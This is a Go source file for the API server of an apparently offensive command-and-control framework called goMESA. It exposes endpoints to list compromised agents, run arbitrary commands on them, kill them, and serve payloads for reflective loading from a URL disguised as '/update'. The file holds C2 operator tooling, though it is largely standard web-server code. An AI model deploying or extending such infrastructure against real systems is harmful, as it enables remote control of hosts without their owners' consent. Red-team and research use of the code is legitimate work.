package api

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"goMESA/internal/server/https_server"
	"log"
	"net/http"
	"strconv"
	"time"

	"goMESA/internal/server"

	"github.com/gorilla/mux"
)

// APIServer represents the HTTP API server
type APIServer struct {
	router      *mux.Router
	db          *server.Database
	ntpServer   *server.NTPServer
	wsServer    *WebSocketServer
	httpServer  *http.Server
	httpsServer *https_server.HTTPSServer
	serverIP    string // External IP/hostname for payload URLs
}

// NewAPIServer creates a new API server
// serverIP is the external IP/hostname used for payload delivery URLs (can be empty if reflective loading not used)
func NewAPIServer(db *server.Database, ntpServer *server.NTPServer, port int, serverIP string) *APIServer {
	router := mux.NewRouter()

	wsServer := NewWebSocketServer(db, ntpServer)

	// Create HTTPS server
	httpsServer := https_server.NewHTTPSServer(
		"../certs/server.crt", // Default TLS certificate path
		"../certs/server.key", // Default TLS private key path
		"0.0.0.0:443",         // Default HTTPS port
	)

	apiServer := &APIServer{
		router:    router,
		db:        db,
		ntpServer: ntpServer,
		wsServer:  wsServer,
		httpServer: &http.Server{
			Addr:    ":" + strconv.Itoa(port),
			Handler: router,
		},
		httpsServer: httpsServer,
		serverIP:    serverIP,
	}

	// Set the APIServer reference in WebSocketServer
	wsServer.SetAPIServer(apiServer)

	// Set up routes
	apiServer.setupRoutes()

	return apiServer
}

// setupRoutes configures the API routes
func (s *APIServer) setupRoutes() {
	// API routes
	api := s.router.PathPrefix("/api").Subrouter()

	// Agents endpoints
	api.HandleFunc("/agents", s.handleGetAgents).Methods("GET")
	api.HandleFunc("/agents/{id}", s.handleGetAgent).Methods("GET")
	api.HandleFunc("/agents/{id}/commands", s.handleGetAgentCommands).Methods("GET")

	// Commands endpoints
	api.HandleFunc("/commands", s.handleCreateCommand).Methods("POST")

	// Actions endpoints
	api.HandleFunc("/actions/ping/{id}", s.handlePingAgent).Methods("POST")
	api.HandleFunc("/actions/kill/{id}", s.handleKillAgent).Methods("POST")
	api.HandleFunc("/actions/group", s.handleGroupAgent).Methods("POST")

	// WebSocket endpoint
	s.router.HandleFunc("/ws", s.wsServer.HandleWebSocket)

	// Static file serving for the Vue.js app
	s.router.PathPrefix("/").Handler(http.FileServer(http.Dir("./ui/dist")))
}

// Start starts the API server
func (s *APIServer) Start() error {
	// Start the WebSocket server
	s.wsServer.Start()

	// In the Start method of APIServer
	s.ntpServer.SetBroadcastHandler(func(msg []byte) {
		s.wsServer.broadcast <- msg
	})

	// Start the HTTPS server
	if err := s.httpsServer.Start(); err != nil {
		log.Printf("Warning: Failed to start HTTPS server: %v", err)
		// Continue anyway, as this is not critical
	}
	log.Printf("Starting HTTPS server on %s.\n", s.httpsServer.GetListenAddr())

	log.Printf("API Server starting on %s", s.httpServer.Addr)
	return s.httpServer.ListenAndServe()
}

// Stop stops the API server
func (s *APIServer) Stop() error {
	if err := s.httpsServer.Stop(); err != nil {
		log.Printf("Warning: Error stopping HTTPS server: %v", err)
	}
	return s.httpServer.Close()
}

// handleGetAgents returns all agents
func (s *APIServer) handleGetAgents(w http.ResponseWriter, r *http.Request) {
	agents, err := s.db.GetAllAgents()
	if err != nil {
		http.Error(w, "Failed to get agents: "+err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agents)
}

// handleGetAgent returns a specific agent_env
func (s *APIServer) handleGetAgent(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	agentID := vars["id"]

	agents, err := s.db.GetAgentsByGroup("agent_id", agentID)
	if err != nil {
		http.Error(w, "Failed to get agent_env: "+err.Error(), http.StatusInternalServerError)
		return
	}

	if len(agents) == 0 {
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agents[0])
}

// handleGetAgentCommands returns commands for a specific agent_env
func (s *APIServer) handleGetAgentCommands(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	agentID := vars["id"]

	commands, err := s.db.GetCommandHistory(agentID)
	if err != nil {
		http.Error(w, "Failed to get commands: "+err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(commands)
}

// handleCreateCommand creates a new command
func (s *APIServer) handleCreateCommand(w http.ResponseWriter, r *http.Request) {
	var requestData struct {
		AgentID string `json:"agentId"`
		Command string `json:"command"`
	}

	err := json.NewDecoder(r.Body).Decode(&requestData)
	if err != nil {
		http.Error(w, "Invalid request body: "+err.Error(), http.StatusBadRequest)
		return
	}

	output, err := s.ntpServer.ExecuteCommand(requestData.AgentID, requestData.Command)

	response := map[string]interface{}{
		"agentId":   requestData.AgentID,
		"command":   requestData.Command,
		"timestamp": time.Now(),
	}

	if err != nil {
		response["error"] = err.Error()
		response["success"] = false
		w.WriteHeader(http.StatusInternalServerError)
	} else {
		response["output"] = output
		response["success"] = true
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// handlePingAgent sends a ping to an agent_env
func (s *APIServer) handlePingAgent(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	agentID := vars["id"]

	err := s.ntpServer.SendPingCommand(agentID)

	response := map[string]interface{}{
		"agentId":   agentID,
		"timestamp": time.Now(),
	}

	if err != nil {
		response["error"] = err.Error()
		response["success"] = false
		w.WriteHeader(http.StatusInternalServerError)
	} else {
		response["success"] = true
		response["message"] = "Ping sent successfully"
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// handleKillAgent sends a kill command to an agent_env
func (s *APIServer) handleKillAgent(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	agentID := vars["id"]

	err := s.ntpServer.SendKillCommand(agentID)

	response := map[string]interface{}{
		"agentId":   agentID,
		"timestamp": time.Now(),
	}

	if err != nil {
		response["error"] = err.Error()
		response["success"] = false
		w.WriteHeader(http.StatusInternalServerError)
	} else {
		response["success"] = true
		response["message"] = "Kill command sent successfully"
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// handleGroupAgent assigns a group/service to an agent_env
func (s *APIServer) handleGroupAgent(w http.ResponseWriter, r *http.Request) {
	var requestData struct {
		AgentID   string `json:"agentId"`
		GroupName string `json:"groupName"`
	}

	err := json.NewDecoder(r.Body).Decode(&requestData)
	if err != nil {
		http.Error(w, "Invalid request body: "+err.Error(), http.StatusBadRequest)
		return
	}

	err = s.db.UpdateAgentGroup(requestData.AgentID, requestData.GroupName)

	response := map[string]interface{}{
		"agentId":   requestData.AgentID,
		"groupName": requestData.GroupName,
		"timestamp": time.Now(),
	}

	if err != nil {
		response["error"] = err.Error()
		response["success"] = false
		w.WriteHeader(http.StatusInternalServerError)
	} else {
		response["success"] = true
		response["message"] = "Agent grouped successfully"
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// RegisterReflectivePayload registers a payload for reflective loading
func (s *APIServer) RegisterReflectivePayload(payloadData []byte, functionName string) (string, string, error) {
	// Validate server IP is configured
	if s.serverIP == "" {
		return "", "", fmt.Errorf("server IP not configured; use -server-ip flag when starting the server")
	}

	// Generate a random payload ID
	idBytes := make([]byte, 16)
	if _, err := rand.Read(idBytes); err != nil {
		return "", "", fmt.Errorf("failed to generate payload ID: %v", err)
	}
	payloadID := hex.EncodeToString(idBytes)

	// Register the payload with the HTTPS server
	s.httpsServer.RegisterPayload(payloadID, payloadData, functionName)

	// Construct the complete URL using configured server IP
	serverURL := fmt.Sprintf("https://%s:443/update?id=%s", s.serverIP, payloadID)

	return payloadID, serverURL, nil
}
